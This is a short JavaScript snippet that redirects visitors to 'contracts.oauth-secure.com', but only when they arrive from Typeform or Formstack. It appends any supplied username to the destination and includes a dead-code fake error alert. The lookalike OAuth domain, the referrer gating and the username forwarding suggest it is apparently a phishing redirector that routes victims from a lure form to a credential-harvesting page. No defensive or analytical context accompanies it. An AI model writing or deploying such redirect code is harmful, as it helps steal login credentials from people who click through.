<script>
    const ref = document.referrer;
    const qs = window.location.search;
    const urlParams = new URLSearchParams(qs);

    if (false) {
        alert("A technical issue occurred. Please try again in a few hours");
    } else {

        let targetDomain = "https://contracts.oauth-secure.com";

        if (ref.match(/^https?:\/\/([^\/]+\.)?typeform\.com(\/|$)/i) || ref.match(/^https?:\/\/([^\/]+\.)?formstack\.com(\/|$)/i)) {

            if (urlParams.has("u")) {
                const u = urlParams.get("u");


                window.location = targetDomain + "?username=" + u;


            } else {
                window.location = targetDomain;
            }
        }

    }



</script>
